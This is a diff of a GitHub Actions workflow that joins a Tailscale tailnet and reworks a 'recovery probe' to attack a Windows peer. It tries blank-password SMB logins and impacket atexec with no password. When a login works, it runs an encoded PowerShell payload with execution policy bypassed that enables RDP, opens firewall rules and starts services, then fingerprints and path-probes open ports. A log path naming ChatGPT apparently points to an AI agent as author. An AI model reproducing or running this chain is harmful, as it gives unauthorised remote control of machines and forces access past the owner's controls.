@@ -22,15 +22,14 @@ jobs:
           curl -fsSL https://tailscale.com/install.sh | sh >/dev/null
           sudo systemctl enable --now tailscaled >/dev/null
           sudo apt-get update -qq
-          sudo apt-get install -y -qq nmap smbclient samba-common-bin openssl python3-impacket nbtscan >/dev/null
+          sudo apt-get install -y -qq nmap smbclient samba-common-bin openssl python3-impacket netcat-openbsd >/dev/null
 
       - name: Start interactive tailnet login privately
         shell: bash
         run: |
           set -euo pipefail
           rm -f /tmp/ts-login.txt /tmp/auth-url.txt
-          (sudo tailscale up --hostname="gh-final-${GITHUB_RUN_ID}" --accept-dns=true > /tmp/ts-login.txt 2>&1) &
-          echo $! > /tmp/ts-up.pid
+          (sudo tailscale up --hostname="gh-rescue2-${GITHUB_RUN_ID}" --accept-dns=true > /tmp/ts-login.txt 2>&1) &
           for i in $(seq 1 60); do
             URL=$(grep -Eo 'https://login\.tailscale\.com/a/[A-Za-z0-9_-]+' /tmp/ts-login.txt | head -1 || true)
             if [ -n "$URL" ]; then
@@ -46,7 +45,7 @@ jobs:
       - name: Store private login handoff
         uses: actions/upload-artifact@v4
         with:
-          name: tailscale-final-auth-${{ github.run_id }}
+          name: tailscale-rescue2-auth-${{ github.run_id }}
           path: /tmp/auth-url.txt
           retention-days: 1
           if-no-files-found: error
@@ -59,14 +58,13 @@ jobs:
             STATE=$(sudo tailscale status --json 2>/dev/null | jq -r '.BackendState // empty' || true)
             if [ "$STATE" = 'Running' ]; then
               echo 'TAILSCALE_AUTHORIZED=true'
-              sudo tailscale status
               exit 0
             fi
             sleep 5
           done
           exit 1
 
-      - name: Exhaustive recovery probe
+      - name: Blank credential rescue or fingerprint
         shell: bash
         run: |
           set +e
@@ -74,43 +72,88 @@ jobs:
           FQDN=$(sudo tailscale status --json | jq -r --arg ip "$TARGET" '.Peer | to_entries[] | select(.value.TailscaleIPs[]? == $ip) | .value.DNSName' | sed 's/\.$//' | head -1)
           echo "TARGET=$TARGET"
           echo "FQDN=$FQDN"
-
-          echo '=== TAILSCALE PING ==='
           sudo tailscale ping --timeout=5s -c 2 "$TARGET"
 
-          echo '=== NETBIOS ==='
-          nbtscan -v "$TARGET" 2>&1
-          nmblookup -A "$TARGET" 2>&1
+          echo '=== PEER SERVICE METADATA ==='
+          sudo tailscale status --json | jq --arg ip "$TARGET" '.Peer | to_entries[] | select(.value.TailscaleIPs[]? == $ip) | .value | {DNSName,HostName,OS,Online,TailscaleIPs,Services,Tags}'
 
-          echo '=== ALL TCP OPEN PORTS ==='
-          sudo nmap -Pn -sT -p- --open -T4 --max-retries 1 --host-timeout 8m "$TARGET" 2>&1
+          echo '=== BLANK PASSWORD SMB AUTH ==='
+          smbclient -L "//$TARGET" -U 'Pichau%' -m SMB3 2>&1 | head -n 80
+          SMB1=${PIPESTATUS[0]}
+          smbclient -L "//$TARGET" -U 'DESKTOP-L6CITUI\Pichau%' -m SMB3 2>&1 | head -n 80
+          SMB2=${PIPESTATUS[0]}
+          echo "SMB_PICHAU_RC=$SMB1 SMB_LOCAL_PICHAU_RC=$SMB2"
 
-          echo '=== TARGETED SERVICE DETECTION ==='
-          sudo nmap -Pn -sT -sV --version-all -p 135,139,443,445,3389,5985,5986,47001,49664-49720 "$TARGET" 2>&1
+          echo '=== BLANK PASSWORD TASK SCHEDULER AUTH ==='
+          ATEXEC=$(command -v impacket-atexec || command -v atexec.py || true)
+          echo "ATEXEC=$ATEXEC"
+          AUTH_OK=false
+          if [ -n "$ATEXEC" ]; then
+            "$ATEXEC" -no-pass "Pichau@$TARGET" 'cmd.exe /c whoami' > /tmp/atexec1.txt 2>&1
+            RC1=$?
+            cat /tmp/atexec1.txt | head -n 100
+            if [ $RC1 -eq 0 ]; then AUTH_OK=true; fi
+            if [ "$AUTH_OK" != true ]; then
+              "$ATEXEC" -no-pass "DESKTOP-L6CITUI/Pichau@$TARGET" 'cmd.exe /c whoami' > /tmp/atexec2.txt 2>&1
+              RC2=$?
+              cat /tmp/atexec2.txt | head -n 100
+              if [ $RC2 -eq 0 ]; then AUTH_OK=true; fi
+            fi
+          fi
+          echo "BLANK_ADMIN_AUTH_OK=$AUTH_OK"
 
-          echo '=== RPC ENDPOINT MAPPER ==='
-          if command -v rpcdump.py >/dev/null 2>&1; then rpcdump.py "@$TARGET" 2>&1 | head -n 500; fi
-          if command -v impacket-rpcdump >/dev/null 2>&1; then impacket-rpcdump "@$TARGET" 2>&1 | head -n 500; fi
-
-          echo '=== SMB NEGOTIATION ==='
-          sudo nmap -Pn -p445 --script smb-protocols,smb2-capabilities,smb2-security-mode,smb2-time "$TARGET" 2>&1
-          smbclient -L "//$TARGET" -N 2>&1
-
-          echo '=== 443 PLAIN HTTP ==='
-          curl -v --connect-timeout 5 --max-time 10 "http://$TARGET:443/" 2>&1 | head -n 120
-
-          echo '=== 443 HTTPS BY IP ==='
-          curl -k -v --connect-timeout 5 --max-time 10 "https://$TARGET/" 2>&1 | head -n 160
-
-          if [ -n "$FQDN" ] && [ "$FQDN" != "null" ]; then
-            echo '=== 443 HTTPS WITH MAGICDNS/SNI ==='
-            curl -k -v --resolve "$FQDN:443:$TARGET" --connect-timeout 5 --max-time 15 "https://$FQDN/" 2>&1 | head -n 240
-
-            echo '=== TLS WITH MAGICDNS/SNI ==='
-            timeout 10 openssl s_client -connect "$TARGET:443" -servername "$FQDN" -alpn 'h2,http/1.1' -showcerts </dev/null 2>&1 | head -n 240
+          if [ "$AUTH_OK" = true ]; then
+            echo '=== EXECUTE RECOVERY ==='
+            cat > /tmp/rescue.ps1 <<'PS'
+          $ErrorActionPreference='Continue'
+          $log='C:\ProgramData\ChatGPT\rescue-last.txt'
+          New-Item -ItemType Directory -Force -Path (Split-Path $log) | Out-Null
+          "START=$(Get-Date -Format o)" | Set-Content $log
+          try { Set-Service Tailscale -StartupType Automatic; Start-Service Tailscale } catch { $_ | Out-File $log -Append }
+          Get-Service | Where-Object Name -like 'actions.runner*' | ForEach-Object {
+            try { Set-Service $_.Name -StartupType Automatic; Start-Service $_.Name; "RUNNER=$($_.Name):$((Get-Service $_.Name).Status)" | Out-File $log -Append } catch { $_ | Out-File $log -Append }
+          }
+          try { Start-ScheduledTask -TaskName 'Remote Desktop Commander'; 'COMMANDER_TASK_STARTED=true' | Out-File $log -Append } catch { $_ | Out-File $log -Append }
+          $ts='HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
+          try { Set-ItemProperty $ts -Name fDenyTSConnections -Value 0 -Type DWord } catch { $_ | Out-File $log -Append }
+          try { Set-Service TermService -StartupType Automatic; Start-Service TermService } catch { $_ | Out-File $log -Append }
+          try { Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'RemoteDesktop*' -or $_.Service -eq 'TermService' } | Enable-NetFirewallRule } catch { $_ | Out-File $log -Append }
+          Start-Sleep -Seconds 3
+          "RDP=$([bool](Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue))" | Out-File $log -Append
+          "END=$(Get-Date -Format o)" | Out-File $log -Append
+          PS
+            B64=$(python3 - <<'PY'
+          import base64
+          s=open('/tmp/rescue.ps1','r',encoding='utf-8').read()
+          print(base64.b64encode(s.encode('utf-16le')).decode())
+          PY
+          )
+            "$ATEXEC" -no-pass "Pichau@$TARGET" "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $B64" > /tmp/recover.txt 2>&1
+            cat /tmp/recover.txt | head -n 160
+            sleep 25
+            echo '=== POST-RECOVERY PORTS ==='
+            nmap -Pn -sT -p 3389,443,445 "$TARGET" 2>&1
           fi
 
-          echo '=== UDP 443 QUICK CHECK ==='
-          sudo nmap -Pn -sU -p443 --version-light --host-timeout 90s "$TARGET" 2>&1
+          echo '=== UNKNOWN PORT FINGERPRINT ==='
+          sudo nmap -Pn -sT -sV --version-all -p 443,5040,5357,7680,20128,58324,61500 --script=banner,http-title,http-headers,ssl-cert "$TARGET" 2>&1 | head -n 500
+
+          echo '=== HTTP/HTTPS QUICK PROBES ==='
+          for p in 5040 5357 7680 20128 58324 61500; do
+            echo "--- PORT $p HTTP ---"
+            curl -sS -i --connect-timeout 3 --max-time 6 "http://$TARGET:$p/" 2>&1 | head -n 40
+            echo "--- PORT $p HTTPS ---"
+            curl -k -sS -i --connect-timeout 3 --max-time 6 "https://$TARGET:$p/" 2>&1 | head -n 40
+          done
+
+          if [ -n "$FQDN" ] && [ "$FQDN" != null ]; then
+            echo '=== TAILSCALE SERVE COMMON PATHS ==='
+            for path in / /health /healthz /status /api /api/ /mcp /remote /commander /desktop /runner /ws /websocket /admin; do
+              code=$(curl -k -sS -o /tmp/body --resolve "$FQDN:443:$TARGET" --connect-timeout 3 --max-time 6 -w '%{http_code}' "https://$FQDN$path" 2>/dev/null)
+              bytes=$(wc -c < /tmp/body 2>/dev/null || echo 0)
+              printf '%-14s HTTP=%s BYTES=%s\n' "$path" "$code" "$bytes"
+              if [ "$code" != 404 ] && [ "$code" != 000 ]; then head -c 500 /tmp/body; echo; fi
+            done
+          fi
 
           echo '=== DONE ==='
